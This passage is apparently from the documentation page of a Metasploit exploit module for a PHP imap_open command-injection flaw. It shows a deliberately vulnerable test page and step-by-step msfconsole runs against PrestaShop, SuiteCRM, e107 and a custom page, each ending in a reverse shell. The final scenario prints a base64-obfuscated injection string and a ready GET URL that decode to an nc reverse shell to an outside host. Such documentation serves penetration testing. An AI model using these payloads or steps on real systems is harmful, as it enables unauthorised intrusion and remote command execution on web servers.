punctuation\">(</span><span class=\"token variable\">$errors</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$str_errors</span> <span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">''</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$errors</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token variable\">$str_errors</span> <span class=\"token punctuation\">.</span><span class=\"token operator\">=</span> <span class=\"token variable\">$error</span> <span class=\"token punctuation\">.</span> <span class=\"token single-quoted-string string\">', '</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$str_errors</span> <span class=\"token operator\">=</span> <span class=\"token function\">rtrim</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str_errors</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$mbox</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'&lt;p>&lt;b>Errors: &lt;/b>'</span> <span class=\"token punctuation\">.</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$str_errors</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install a vulnerable application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/http/php_imap_open_rce</code></li>\n<li>Do: <code class=\"language-text\">set TARGETURI [URI]</code></li>\n<li>Do: <code class=\"language-text\">set USERNAME [username]</code></li>\n<li>Do: <code class=\"language-text\">set PASSWORD [password]</code></li>\n<li>Do: <code class=\"language-text\">set target [target]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>TARGETURI</strong></p>\n<p>  The URI for the target.  This may change by target.  Default is <code class=\"language-text\"></code>.\nPrestashop should be the admin URI, similar to <code class=\"language-text\">/admin2769gx8k3</code>.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"prestashop-1724-on-ubuntu-16044-with-php-70\" style=\"position:relative;\"><a href=\"#prestashop-1724-on-ubuntu-16044-with-php-70\" aria-label=\"prestashop 1724 on ubuntu 16044 with php 70 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PrestaShop 1.7.2.4 on Ubuntu 16.04.4 with PHP 7.0</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (presta.rb)&gt; use exploit/linux/http/php_imap_open_rce\nresource (presta.rb)&gt; set TARGETURI /admin2769gx8k3\nTARGETURI =&gt; /admin2769gx8k3\nresource (presta.rb)&gt; set USERNAME ubuntu@none.com\nUSERNAME =&gt; ubuntu@none.com\nresource (presta.rb)&gt; set PASSWORD ubuntuubuntu\nPASSWORD =&gt; ubuntuubuntu\nresource (presta.rb)&gt; set rhosts 1.1.1.1\nrhosts =&gt; 1.1.1.1\nresource (presta.rb)&gt; set lhost 2.2.2.2\nlhost =&gt; 2.2.2.2\nresource (presta.rb)&gt; set target 0\ntarget =&gt; 0\nresource (presta.rb)&gt; set verbose true\nverbose =&gt; true\nresource (presta.rb)&gt; exploit\n[*] Started reverse TCP handler on 2.2.2.2:4444 \n[*] Redirected to http://1.1.1.1/admin2769gx8k3/\n[*] Redirected to http://1.1.1.1/admin2769gx8k3/index.php?controller=AdminLogin&amp;token=6dab1f7b4eea17d2b44a8929ead9df68\n[*] Token: 6dab1f7b4eea17d2b44a8929ead9df68 and Login Redirect: http://1.1.1.1/admin2769gx8k3/&amp;token=09283f9efc45fc75eca3b8d5f1b1f92f\n[*] Logging in with ubuntu@none.com:ubuntuubuntu\n[*] Login JSON Response: {&quot;hasErrors&quot;:false,&quot;redirect&quot;:&quot;http:\\/\\/1.1.1.1\\/admin2769gx8k3\\/index.php?controller=AdminDashboard&amp;token=e324e8b387afb1874947db9b1ba411c8&quot;}\n[+] Login Success, loading admin dashboard to pull tokens\n[*] Customer Threads Token: ec653c8bfc09754fc63aaa94101911dc\n[+] Sending Payload with Final Token: ec653c8bfc09754fc63aaa94101911dc\n[*] IMAP server change left on server, manual revert required.\n[*] Command shell session 1 opened (2.2.2.2:4444 -&gt; 1.1.1.1:41964) at 2018-11-20 18:29:28 -0500\n\nuname -a\nLinux ubuntu1604 4.4.0-138-generic #164-Ubuntu SMP Tue Oct 2 17:16:02 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"suitecrm-7823-on-ubuntu-16044-with-php-70\" style=\"position:relative;\"><a href=\"#suitecrm-7823-on-ubuntu-16044-with-php-70\" aria-label=\"suitecrm 7823 on ubuntu 16044 with php 70 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SuiteCRM 7.8.23 on Ubuntu 16.04.4 with PHP 7.0</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (suitecrm.rb)&gt; use exploit/linux/http/php_imap_open_rce\nresource (suitecrm.rb)&gt; set target 1\ntarget =&gt; 1\nresource (suitecrm.rb)&gt; set TARGETURI /\nTARGETURI =&gt; /\nresource (suitecrm.rb)&gt; set USERNAME admin\nUSERNAME =&gt; admin\nresource (suitecrm.rb)&gt; set PASSWORD admin\nPASSWORD =&gt; admin\nresource (suitecrm.rb)&gt; set rhosts 1.1.1.1\nrhosts =&gt; 1.1.1.1\nresource (suitecrm.rb)&gt; set lhost 2.2.2.2\nlhost =&gt; 2.2.2.2\nresource (suitecrm.rb)&gt; set verbose true\nverbose =&gt; true\nresource (suitecrm.rb)&gt; exploit\n[*] Started reverse TCP handler on 2.2.2.2:4444 \n[*] Loading login page\n[*] Logging in as admin:admin\n[+] Login Success\n[*] Loading InboundEmail page\n[+] Sending payload with group_id f047031d-1697-3d0d-bd39-5bf499e5470a\n[*] IMAP server config left on server, manual removal required.\n[*] Command shell session 1 opened (2.2.2.2:4444 -&gt; 1.1.1.1:32806) at 2018-11-20 18:31:40 -0500\n\nuname -a \nLinux ubuntu1604 4.4.0-134-generic #160-Ubuntu SMP Wed Aug 15 14:58:00 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"e107-219-on-ubuntu-16044-with-php-70\" style=\"position:relative;\"><a href=\"#e107-219-on-ubuntu-16044-with-php-70\" aria-label=\"e107 219 on ubuntu 16044 with php 70 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>e107 2.1.9 on Ubuntu 16.04.4 with PHP 7.0</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (e107.rb)&gt; use exploit/linux/http/php_imap_open_rce\nresource (e107.rb)&gt; set target 2\ntarget =&gt; 2\nresource (e107.rb)&gt; set TARGETURI /\nTARGETURI =&gt; /\nresource (e107.rb)&gt; set USERNAME admin\nUSERNAME =&gt; admin\nresource (e107.rb)&gt; set PASSWORD admin\nPASSWORD =&gt; admin\nresource (e107.rb)&gt; set rhosts 1.1.1.1\nrhosts =&gt; 1.1.1.1\nresource (e107.rb)&gt; set lhost 2.2.2.2\nlhost =&gt; 2.2.2.2\nresource (e107.rb)&gt; set verbose true\nverbose =&gt; true\nresource (e107.rb)&gt; exploit\n[*] Started reverse TCP handler on 2.2.2.2:4444 \n[*] Logging in as admin:admin\n[+] Login Success\n[*] Checking if Cron is enabled for triggering\n[+] Storing payload in mail settings\n[*] Loading cron page to execute job manually\n[+] Triggering manual run of mail bounce check cron to execute payload with cron id 3 and etoken 3b6aa8ca02dbd2bf8218874606c5e2f1\n[*] IMAP server config left on server, manual removal required.\n[*] Command shell session 1 opened (2.2.2.2:4444 -&gt; 1.1.1.1:50742) at 2018-11-23 20:01:13 -0500\n\nuname -a\nLinux ubuntu1604 4.4.0-134-generic #160-Ubuntu SMP Wed Aug 15 14:58:00 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"custom-page-on-ubuntu-1604-1\" style=\"position:relative;\"><a href=\"#custom-page-on-ubuntu-1604-1\" aria-label=\"custom page on ubuntu 1604 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Custom Page on Ubuntu 16.04</h3>\n<p>Using the <code class=\"language-text\">imap.php</code> page listed above.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/php_imap_open_rce \nmsf5 exploit(linux/http/php_imap_open_rce) &gt; set target 3\ntarget =&gt; 3\nmsf5 exploit(linux/http/php_imap_open_rce) &gt; set lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nmsf5 exploit(linux/http/php_imap_open_rce) &gt; set rhost 2.2.2.2\nrhost =&gt; 2.2.2.2\nmsf5 exploit(linux/http/php_imap_open_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[*] Listener started for 300 seconds\n[+] POST request connection string: x -oProxyCommand=`echo$IFS$()bWtmaWZvIC90bXAvaWVib3U7IG5jIDE5Mi4xNjguMi4xMTcgNDQ0NCAwPC90bXAvaWVib3UgfCAvYmluL3NoID4vdG1wL2llYm91IDI+JjE7IHJtIC90bXAvaWVib3U=|base64$IFS$()-d|bash`}\n[+] GET request connection string: x%20-oProxyCommand=%60echo$IFS$()bWtmaWZvIC90bXAvaWVib3U7IG5jIDE5Mi4xNjguMi4xMTcgNDQ0NCAwPC90bXAvaWVib3UgfCAvYmluL3NoID4vdG1wL2llYm91IDI%2BJjE7IHJtIC90bXAvaWVib3U=%7Cbase64$IFS$()-d%7Cbash%60%7D\n[*] Command shell session 1 opened (1.1.1.1:4444 -&gt; 2.2.2.2:41124) at 2018-11-25 10:52:55 -0500\n\nuname -a\nLinux ubuntu1604 4.4.0-134-generic #160-Ubuntu SMP Wed Aug 15 14:58:00 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The GET request was utilized, and the final URL utilized was: <code class=\"language-text\">http://2.2.2.2/imap.php?server=x%20-oProxyCommand=%60echo$IFS$()bWtmaWZvIC90bXAvaWVib3U7IG5jIDE5Mi4xNjguMi4xMTcgNDQ0NCAwPC90bXAvaWVib3UgfCAvYmluL3NoID4vdG1wL2llYm91IDI%2BJjE7IHJtIC90bXAvaWVib3U=%7Cbase64$IFS$()-d%7Cbash%60%7D</code></p>"}}},"pageContext":{"id":"96d89511-05ae-5483-b452-0fbca20e1048"}}}